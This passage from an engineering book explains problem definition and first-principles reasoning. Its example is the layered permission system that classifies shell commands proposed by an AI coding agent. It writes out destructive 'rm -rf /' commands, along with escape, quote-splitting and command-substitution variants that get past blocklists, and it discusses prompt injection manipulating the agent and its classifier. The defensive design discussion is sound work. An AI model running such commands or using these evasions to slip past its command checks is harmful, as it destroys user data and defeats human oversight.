    L1 -->|"matched allow"| ALLOW[Auto-approved]
    L1 -->|"no match"| L2
    L2 -->|"known dangerous"| ASK_D[Ask User - Dangerous]
    L2 -->|"known safe"| ALLOW
    L2 -->|"ambiguous"| L3
    L3 -->|"safe"| ALLOW
    L3 -->|"dangerous"| ASK_AI[Ask User - AI Flagged]

    style CMD fill:#1a1a2e,stroke:#e94560,color:#fff
    style BLOCK fill:#4a0e0e,stroke:#ef4444,color:#fff
    style ALLOW fill:#0a4c2e,stroke:#10b981,color:#fff
    style ASK_D fill:#4a3f00,stroke:#eab308,color:#fff
    style ASK_AI fill:#4a3f00,stroke:#eab308,color:#fff

Layer 1 (static rules) uses glob-pattern matching from the configuration cascade. An enterprise administrator can deny Bash(rm -rf *). A user can allow Bash(git *). These rules are fast (microseconds) and deterministic.

Layer 2 (structural analysis) is the parser-based classifier. It handles the general case: commands that no static rule covers but whose structure reveals their risk level.

Layer 3 (AI classifier) is a secondary LLM call that evaluates commands Layer 2 cannot classify. It adds latency and cost but handles commands that are structurally ambiguous (safe syntax but dangerous semantics).

The evaluation order -- deny before ask before allow -- ensures that explicit deny rules always win, regardless of what the structural analyzer or AI classifier thinks. This is a security invariant: you can always block a command by adding a deny rule.

What the Evolution Teaches

The bash security system went through four problem definitions not because the engineers were confused, but because understanding the problem is the work. Each formulation revealed new dimensions:

  • v1 revealed that the space of dangerous commands is unbounded.
  • v2 revealed that understanding command structure is necessary.
  • v3 revealed that structural patterns can classify most commands.
  • v4 revealed that no single layer handles all cases -- you need defense in depth.

The final system spans 12,000+ lines across six files:

File Lines Role in the Architecture
bashParser.ts ~4,400 Full POSIX shell parser: tokenizer, AST builder, grammar rules
ast.ts ~2,700 AST node type definitions, traversal utilities, analysis helpers
bashSecurity.ts ~2,600 Structural risk patterns: injection, escalation, exfiltration
bashPermissions.ts ~2,600 Rule evaluation: deny/ask/allow against the settings cascade
readOnlyValidation.ts ~1,990 Read-only classification for auto-mode: is this command side-effect-free?
BashTool.ts ~800 Tool implementation: ties parser, security, and permissions together

12,000+ lines for "which commands are safe?" If you had started coding at problem definition v1, you would have built a 200-line regex matcher. It would have shipped. It would have been bypassed within a week. The 12,000 lines exist because the problem definition evolved, and each evolution demanded more sophisticated machinery.

The Problem Definition Template

Every engineering problem benefits from a structured definition before work begins. Here is the template, with the bash security system as the worked example:

Template

PROBLEM DEFINITION
==================

Context:
  What system? What users? What operational environment?

Problem:
  What specific failure or capability? State precisely.

Constraints:
  What cannot change? What bounds the solution space?

Success Criteria:
  How will we know it's solved? (Specific, measurable)

Non-Goals:
  What are we explicitly not solving?

Failure Modes:
  How can the solution fail? What is the consequence of each?

Open Questions:
  What do we not yet know? What investigation is needed?

Worked Example

PROBLEM DEFINITION: Bash Command Classification
================================================

Context:
  Claude Code is an AI CLI agent that executes shell commands on behalf
  of an LLM in the user's development environment. Commands range from
  benign (git status) to catastrophic (rm -rf /). The agent must gate
  every command through a classification system.

Problem:
  Classify arbitrary shell commands into three risk categories (safe,
  needs-approval, blocked) with zero false negatives on dangerous
  commands. False negatives cause data loss or system compromise.
  False positives cause UX friction but are tolerable.

Constraints:
  - Latency: < 50ms per classification
  - No external dependencies (no shellcheck, no network calls)
  - Must handle full POSIX shell grammar
  - Must resist adversarial input (LLM may be manipulated)
  - Must integrate with enterprise policy layer
  - Must work offline

Success Criteria:
  - 0 false negatives on 200+ known-dangerous patterns
  - < 10ms classification for typical commands
  - Unparseable commands default to "needs-approval"
  - No regression in existing permission behavior

Non-Goals:
  - Not sandboxing execution
  - Not detecting malware signatures
  - Not preventing user-initiated dangerous commands

Failure Modes:
  - Parser cannot handle a shell construct → Unrecognized defaults
    to "needs-approval" (safe failure)
  - Adversarial command bypasses all patterns → AI classifier
    (Layer 3) provides fallback judgment
  - AI classifier is manipulated → Static deny rules (Layer 1)
    override classifier for known-dangerous patterns
  - Enterprise policy conflicts with user rules → Policy layer
    has highest priority in the settings cascade

Open Questions:
  - How do we handle shell built-ins vs. external commands?
  - What about commands that are safe on Linux but dangerous on macOS?
  - How do we classify commands that invoke interpreters
    (python -c, node -e)?

This template takes 20-30 minutes to fill out. It prevents weeks of wasted work. It is the single highest-leverage activity in engineering.

Common Problem Definition Failures

Failure 1: Solving the Solution

The most common mistake is defining the problem as a solution. "We need a microservices architecture" is not a problem -- it is a solution. The problem might be "our monolith takes 45 minutes to deploy, and independent teams cannot release without coordinating." The solution might be microservices. Or it might be better CI/CD pipelines. Or it might be feature flags that decouple deployment from release. You cannot evaluate the solution until you define the problem.

In Claude Code, "we need a bash parser" is a solution. The problem is "we need to classify shell commands by structural risk." The parser is one implementation. A shell emulator would be another. A tree-sitter grammar would be a third. Defining the problem as "build a parser" forecloses the evaluation of alternatives.

Failure 2: Problem as Symptom

"The tests are slow" is a symptom. The problem might be: - The test suite runs all tests sequentially when they could run in parallel - Integration tests start a database for each test instead of sharing one - The test framework itself has slow startup - The tests are actually fast but the CI runner is underpowered

Each of these is a different problem with a different solution. Investigating the symptom before defining the problem saves you from optimizing the wrong thing.

Failure 3: Missing Constraints

A problem definition without constraints is a blank check. "Build a permission system" without constraints allows everything from a simple boolean flag to a full RBAC engine with role hierarchies, attribute-based policies, and audit logging. Constraints like "must work without a database," "must classify in under 50ms," and "must integrate with enterprise MDM" narrow the solution space to something achievable.

The most dangerous missing constraint is the one nobody thought to ask about. In Claude Code's case, the constraint "must resist adversarial input" was not in the initial requirements. It emerged from threat modeling -- the realization that the LLM could be manipulated by prompt injection in untrusted content. If this constraint had been discovered after building a trust-based classifier, the entire system would have needed redesigning.

Failure 4: Premature Precision

Problem definitions should be precise about what to solve but imprecise about how to solve it. "Build a recursive descent parser for POSIX shell with 47 grammar rules" is premature precision. "Parse shell commands into ASTs that support structural risk analysis" is appropriately precise about the goal and imprecise about the implementation.

The rule of thumb: if your problem definition constrains the implementation technique, you have slipped from problem definition into design. Pull back.

Failure 5: Missing Failure Modes

A problem definition without failure modes is optimistic fiction. Every system fails. The question is not whether it will fail, but how. A problem definition that enumerates failure modes forces the designer to build recovery paths before they encounter failures in production.

Claude Code's bash classifier has three failure modes, each with a designed recovery:

  1. Parser failure: Unrecognized syntax defaults to "needs approval" (fail-safe)
  2. Classifier uncertainty: Ambiguous commands escalate to the AI classifier (defense in depth)
  3. AI classifier manipulation: Static deny rules override AI judgment for known-dangerous patterns (policy override)

Each recovery was designed because the failure mode was anticipated in the problem definition. None of them would have been designed if the problem definition said only "classify commands as safe or dangerous."

From Problem to Architecture

A well-formed problem definition does not produce code. It produces architecture -- the structural decisions that determine what code will be written.

The bash security problem definition produces this architecture:

graph LR
    subgraph Input
        CMD[Shell Command String]
    end

    subgraph Layer1["Layer 1: Static Rules"]
        RULES[Permission Rules<br/>from Settings Cascade]
        EVAL[Rule Evaluator<br/>Glob Matching]
    end

    subgraph Layer2["Layer 2: Structural Analysis"]
        TOKENIZER[Tokenizer]
        PARSER[Parser]
        AST[AST Builder]
        SECURITY[Risk Classifier]
    end

    subgraph Layer3["Layer 3: AI Judgment"]
        PROMPT[Classification Prompt]
        LLM_CALL[Secondary LLM Call]
    end

    subgraph Output
        VERDICT[Safe / Ask / Block]
    end

    CMD --> EVAL
    EVAL -->|"deny match"| VERDICT
    EVAL -->|"allow match"| VERDICT
    EVAL -->|"no match"| TOKENIZER
    TOKENIZER --> PARSER
    PARSER --> AST
    AST --> SECURITY
    SECURITY -->|"classified"| VERDICT
    SECURITY -->|"ambiguous"| PROMPT
    PROMPT --> LLM_CALL
    LLM_CALL --> VERDICT

    style Input fill:#1a1a2e,stroke:#e94560,color:#fff
    style Layer1 fill:#16213e,stroke:#0f3460,color:#fff
    style Layer2 fill:#0f3460,stroke:#e94560,color:#fff
    style Layer3 fill:#533483,stroke:#e94560,color:#fff
    style Output fill:#0a4c2e,stroke:#10b981,color:#fff

Every box in this diagram traces back to a specific clause in the problem definition:

  • Rule Evaluator exists because of the constraint "must integrate with enterprise policy layer"
  • Tokenizer/Parser/AST exists because of the constraint "must handle full POSIX shell grammar"
  • Risk Classifier exists because of the success criterion "zero false negatives on dangerous patterns"
  • Secondary LLM Call exists because of the failure mode "classifier uncertainty → escalate to AI judgment"
  • Deny-before-allow evaluation order exists because of the constraint "must resist adversarial input"

The architecture is the problem definition made structural. It is not a creative leap -- it is a systematic derivation. Given these constraints and these failure modes, this architecture is the natural (perhaps the only) solution that satisfies all of them simultaneously.

This is why problem definition is more valuable than code. The architecture falls out of a good problem definition. The code falls out of a good architecture. But without the problem definition, you are guessing at architecture, and every guess is a coin flip.

The Iterative Nature of Problem Definition

Problem definition is not a phase that ends. It is a continuous process that runs alongside implementation. As you build, you learn things that change the problem:

During parser implementation, the team discovered that bash and sh have different quoting rules for ANSI-C strings ($'...'). The problem definition expanded: "must handle POSIX shell grammar" became "must handle multiple shell dialects."

During testing, the team discovered that some commands are dangerous on macOS but safe on Linux (and vice versa). The problem definition expanded: "must classify commands by risk" became "must classify commands by risk with platform awareness."

During production deployment, the team discovered that users frequently run package managers (npm install, pip install) that are technically "write operations" but are expected to be auto-approved in development workflows. The problem definition expanded: "classify by structural risk" became "classify by structural risk with context-aware exceptions for common development tools."

Each expansion added code. The parser grew to handle dialect differences. The classifier gained platform-specific rules. The permission system gained "common development command" heuristics. The 12,000-line total is not accidental -- it is the accumulation of problem understanding over time.

When to Revise the Problem Definition

Three signals indicate your problem definition needs revision:

  1. Edge cases are multiplying. If you keep adding special cases to handle situations your design did not anticipate, the problem definition is too narrow. Widen it.

  2. The solution feels forced. If the implementation requires increasingly complex workarounds to fit the architecture, the architecture may be solving the wrong problem. Step back and re-examine.

  3. Users are working around your solution. If users are disabling your permission system, suppressing your warnings, or finding escape hatches, you have solved a problem they do not have. Find the real problem.

Problem Definition as a Team Practice

Problem definition is not a solo activity. It benefits from multiple perspectives, especially perspectives outside engineering:

Product managers reveal user constraints. "Our enterprise customers require MDM-enforced policies" is a constraint that changes the permission architecture.

Security engineers reveal adversarial constraints. "The LLM can be manipulated by prompt injection" is a constraint that changes the trust model.

Support engineers reveal failure constraints. "Users report that the permission prompt appears 40 times per session" is a signal that the classification threshold is wrong.

Operations engineers reveal deployment constraints. "We cannot require users to install external tools" eliminates shellcheck as a dependency.

The problem definition template is a communication artifact. It can be reviewed by non-engineers who understand the domain but not the implementation. A product manager can review success criteria. A security engineer can review failure modes. An operations engineer can review constraints. Each reviewer adds a constraint or failure mode that the original author missed.

The Economics of Problem Definition

Problem definition has a measurable return on investment. Here is the calculation:

Cost of a wrong problem definition: The bash security system, built on regex matching (problem definition v1), would have taken approximately 2 days to implement. It would have been bypassed within a week of deployment. Fixing it would require discarding the regex approach and building a parser -- 3 weeks of work. Total cost: 2 days wasted + 3 weeks of recovery = 17 days.

Cost of a right problem definition: Spending 2 days on problem definition (techniques in this chapter) and building the parser-based classifier directly: 2 days of problem definition + 3 weeks of implementation = 17 days. Same calendar time, but zero waste. The parser ships correctly the first time.

Cost of an evolved problem definition: Spending 1 day on initial problem definition, building a minimal parser, learning from deployment, and iterating: 1 day of problem definition + 1 week minimal implementation + 2 weeks iteration = 16 days. Slightly faster, with the benefit of production learning.

The economics are not about speed. They are about waste. A wrong problem definition creates work that must be discarded. A right problem definition creates work that accumulates. Over a career, the difference between engineers who define problems well and those who do not is measured in months of wasted effort.

Key Principles

  1. Symptoms are not problems. Interrogate every symptom with "why?" until the structural cause emerges. The five-why technique takes minutes and saves weeks.

  2. Constraints are more valuable than requirements. Requirements tell you what to build. Constraints tell you what you cannot build, which narrows the solution space to what's actually viable.

  3. Failure modes are design inputs. Every failure mode you anticipate in the problem definition becomes a recovery path in the architecture. Failure modes you miss become production incidents.

  4. Problem definition is iterative. Your first formulation will be wrong. Build enough to learn, then revise the definition. The bash security system went through four formulations. Each one was right for its level of understanding.

  5. The problem definition template is the highest-leverage artifact in engineering. Twenty minutes of structured thinking prevents weeks of building the wrong thing. Context, problem, constraints, success criteria, non-goals, failure modes, open questions. Fill it out before you write a line of code.

Think About It

  1. The definition drill. Take a bug you fixed recently. Write the problem definition retroactively -- context, problem, constraints, success criteria. Now look at your fix. Did it solve the problem you defined, or a different problem? If different, what would the correct fix have been?

  2. Constraint archaeology. Your system has performance constraints that nobody documented. Find one by measurement: profile a critical path, identify the slowest step, and determine what the performance budget should be. Write it down. Now ask: if you had known this constraint before building the system, what would you have designed differently?

  3. The failure mode exercise. Take a system you are responsible for. List every external dependency (APIs, databases, filesystems, networks). For each one, answer: "What happens when this dependency is unavailable?" If the answer is "the system crashes" or "I don't know," you have found a gap in your problem definition.

  4. Problem definition v1 vs. v4. Take a feature you are about to build. Write a problem definition in 5 minutes (v1). Now spend 30 minutes on failure-first thinking and boundary analysis. Write a revised problem definition (v2). Compare them. What constraints and failure modes did v2 reveal that v1 missed? How would the architecture differ?

  5. The non-goal test. Look at a recent project that experienced scope creep. Write the non-goals that should have been in the problem definition. Would those non-goals have prevented the creep? Share them with your team and discuss: is it harder to define what you are building, or what you are not building?

Chapter 3: First Principles Reasoning

The Most Dangerous Words in Engineering

"We've always done it this way."

Six words that have produced more bad architecture than any technical limitation. Analogy-driven reasoning -- "Netflix uses microservices, so we should too" -- is the default mode of engineering decision-making, and it is almost always wrong. Not because the analogy is wrong, but because the constraints are different.

First principles reasoning strips a problem to its irreducible physical and logical constraints, then builds upward from those constraints. It asks: What must be true regardless of convention? The answer is usually surprising, because conventions accumulate decades of context that may no longer apply. When you reason from first principles, you discover that the "obvious" solution is obvious only because everyone copied it from someone who copied it from someone who solved a different problem.

This chapter teaches first principles reasoning through the lens of real engineering decisions in Claude Code -- a 500K-line production AI CLI agent. The centerpiece: why the team built a 4,400-line shell parser from scratch instead of using regex, and why that decision was not merely correct but inevitable once the problem was stated in first principles terms.

Why Analogies Mislead

Analogy-driven reasoning follows a template:

  1. System X has a similar problem to ours
  2. System X solved it with approach A
  3. Therefore, we should use approach A

The flaw is in step 1. "Similar" does an enormous amount of unexamined work. Two problems can look similar on the surface while differing in the constraints that actually drive the design.

The Microservices Analogy

Consider a team building a CLI tool. They observe that Netflix, Amazon, and Uber all use microservices. Their CLI tool has a "server component" (a daemon that manages state) and a "client component" (the user-facing CLI). The analogy suggests: split them into microservices.

First principles analysis asks different questions:

  • How many users does each instance serve? Netflix serves millions of concurrent users. A CLI tool serves one. The scaling constraint that justifies microservices does not exist.
  • Do components need independent deployment? Netflix has hundreds of teams deploying independently. A CLI tool has one team and ships one binary. The organizational constraint does not exist.
  • What is the cost of a network hop? For Netflix, inter-service calls happen within a datacenter at sub-millisecond latency. For a CLI tool, the "network hop" is localhost IPC -- but it still adds serialization overhead, connection management, error handling for disconnects, and debugging complexity. The cost is not zero.

Claude Code faced exactly this decision. The team chose a monolithic binary -- not because they were unaware of microservices, but because every first-principles constraint pointed away from them:

Constraint Microservice Implication CLI Reality
Concurrent users Independent scaling needed One user, one process
Team deployment Teams deploy independently One team, atomic releases
Fault isolation Crashed service doesn't affect others One process -- crash means restart
Technology diversity Different services in different languages One language, shared types
Startup time Client starts fast, daemon already running One binary must start in 400ms

The monolith was not the "default" or "lazy" choice. It was the derived choice -- the one that falls out when you strip away every constraint that justifies the alternative.

The Danger of Cargo Culting

Analogy-driven reasoning is dangerous precisely because it feels rigorous. "Google does X" sounds like evidence. But Google has constraints you don't have: millions of engineers, petabytes of data, regulatory requirements across dozens of jurisdictions, hardware they designed themselves. Borrowing their solution without borrowing their constraints is cargo culting -- building the form without understanding the function.

First principles reasoning is harder. It requires you to enumerate your actual constraints, not the constraints you wish you had. It forces uncomfortable admissions: "We have one user." "We have one team." "We don't need to scale." These admissions feel like limitations, but they are actually liberations. Every constraint you don't have is a constraint you don't need to engineer for.

The Five Whys Applied to Architecture

Toyota's "Five Whys" technique is a first principles tool disguised as a quality practice. Each "why?" strips away a layer of assumption until you reach the irreducible constraint.

Example: Why Build a Shell Parser?

Claude Code needs to execute shell commands on behalf of an AI model. The model generates bash commands; the system must evaluate whether each command is safe before executing it. The question: how do you determine if a shell command is safe?

Why 1: Why not just use a blocklist? Because blocklists are incomplete. You can block rm -rf /, but the attacker writes r\m -rf / (backslash escape), 'r'"m" -rf / (quote splitting), or $(echo rm) -rf / (command substitution). The set of dangerous commands is unbounded; the set of evasion techniques is creative.

Why 2: Why not use regex? Because regex matches syntax, not semantics. The command echo "rm -rf /" is safe -- it prints a string. The command rm -rf / is destructive. Regex cannot distinguish between "contains the characters rm -rf /" and "executes rm -rf /." The fundamental problem is that regex operates on the textual surface, not on the command's execution structure.

Why 3: Why does the execution structure matter? Because shell syntax is a language with quoting rules, escape sequences, pipes, subshells, command substitution, heredocs, and operator precedence. The meaning of a character depends on its syntactic context. A | inside single quotes is a literal character. A | outside quotes is a pipe operator. The same bytes mean different things depending on context. Only a parser can track that context.

Why 4: Why not use an existing parser? Because existing shell parsers are designed for execution, not for security analysis. Bash's own parser evaluates commands as it parses them -- it doesn't produce an AST you can inspect before execution. Tree-sitter provides syntax trees, but it's an external dependency that adds attack surface and may not handle all shell dialects. ShellCheck is a linter, not a security classifier. Each existing tool solves an adjacent problem, not the actual problem.

Why 5: Why is the actual problem different? Because the actual problem is: given a command string, determine what programs it will execute, with what arguments, in what order, with what I/O redirections, before running it. This requires a parser that: - Resolves all quoting and escaping to produce normalized tokens - Builds an AST that represents the execution structure - Recursively analyzes command substitutions and nested shells - Classifies each command by its semantic behavior (read-only, write, destructive, network)

No existing tool does all four. The first principles analysis terminates at: you can't secure what you can't parse. You must build a parser.

graph TD
    A["Problem: Is this shell command safe?"] --> B["Why not blocklist?"]
    B --> C["Evasion: rm → r\\m, quote splitting, $(echo rm)"]
    C --> D["Why not regex?"]
    D --> E["Regex matches text, not execution structure"]
    E --> F["Why does structure matter?"]
    F --> G["Shell syntax is context-dependent:<br/>| in quotes ≠ | outside quotes"]
    G --> H["Why not existing parser?"]
    H --> I["Existing parsers: execute (bash),<br/>lint (shellcheck), syntax (tree-sitter)<br/>— none classify for security"]
    I --> J["Why is the problem different?"]
    J --> K["Need: parse → AST → classify → decide<br/>BEFORE execution"]
    K --> L["First Principle: You can't secure<br/>what you can't parse"]

    style L fill:#1a1a2e,stroke:#e94560,color:#fff

The Five Whys didn't produce the answer directly. They eliminated every alternative until only one answer remained. This is how first principles reasoning works: it is a process of elimination driven by constraints, not a flash of insight.

Reasoning from Physics, Not Convention

Elon Musk popularized the phrase "reasoning from first principles rather than by analogy." The physics framing is useful: in physics, first principles are the fundamental laws (conservation of energy, speed of light, thermodynamics) that constrain all solutions. In engineering, the equivalent is the set of constraints that cannot be negotiated away.

Identifying Your Physics

Every engineering problem has its own "physics" -- constraints that are as immovable as the speed of light within the problem's domain. The discipline is identifying them.

Performance physics. Human perception research shows that delays under 100ms feel instantaneous, 100-400ms feel responsive, and over 1 second feels slow. This is not a convention -- it is a property of the human nervous system. When Claude Code set a 400ms startup budget, they were reasoning from the physics of human perception, not from the convention of "CLI tools should be fast."

Security physics. An attacker only needs to find one vulnerability. A defender must close all of them. This asymmetry is a physical property of security -- it cannot be eliminated by better tools or processes, only managed through defense in depth. When Claude Code built nine layers of security for its Bash tool (parse, classify, pattern check, permission rules, AI classifier, sandbox, and more), they were reasoning from the physics of defender asymmetry.

Complexity physics. Fred Brooks's distinction between essential and accidental complexity is a first principle. Essential complexity is inherent to the problem; accidental complexity is introduced by the solution. A shell parser must handle every quoting rule -- that is essential complexity. If the parser also had a plugin system nobody uses, that would be accidental complexity. The physics says: you can eliminate accidental complexity, but essential complexity is irreducible. Fighting it wastes energy.

The Cost Model as Physics

Every system has a dominant cost model that shapes its architecture. For Claude Code, the dominant cost is API prompt caching:

  • A prompt cache hit costs approximately $0.03 per 70K-token system prompt
  • A prompt cache miss costs approximately $0.20 per 70K-token system prompt
  • The ratio: a miss costs roughly 7x a hit

This cost model is as constraining as a physical law. Any architectural change that causes unnecessary cache misses has a direct, measurable financial impact. The team designed cache latching -- boolean fields that never revert once set -- because the physics of their cost model demanded stable cache keys. This is not a "best practice." It is a direct consequence of the cost function.

graph LR
    subgraph "Identify Your Physics"
        P1["Human perception<br/>< 400ms = responsive"]
        P2["Security asymmetry<br/>attacker needs 1 hole"]
        P3["Essential complexity<br/>irreducible problem size"]
        P4["Cost model<br/>cache miss = 7x cost"]
    end

    subgraph "Derived Decisions"
        D1["400ms startup budget"]
        D2["9-layer security pipeline"]
        D3["4,400-line parser<br/>(no shortcuts)"]
        D4["Cache latching<br/>(sticky-on booleans)"]
    end
